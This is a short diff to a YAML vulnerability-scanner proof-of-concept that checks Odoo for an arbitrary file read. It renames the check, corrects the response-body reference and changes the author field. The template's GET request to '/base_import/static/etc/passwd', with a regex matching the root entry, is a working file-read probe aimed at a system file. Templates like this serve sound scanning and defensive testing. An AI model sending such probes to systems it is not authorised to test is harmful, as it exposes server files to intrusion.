@@ -1,4 +1,4 @@
-name: poc-yaml-odoo-file-read
+name: poc-yaml-odoo-file-inclusion
 groups:
   win:
     - method: GET
@@ -7,8 +7,8 @@ groups:
   linux:
     - method: GET
       path: "/base_import/static/etc/passwd"
-      expression: response.status == 200 && r'root:[x*]:0:0:'.bmatches(body)
+      expression: response.status == 200 && r'root:[x*]:0:0:'.bmatches(response.body)
 detail:
-  author: amos
+  author: amos1
   links:
     - https://quake.360.cn/quake/#/vulDetail/QH-202006-1954/checked
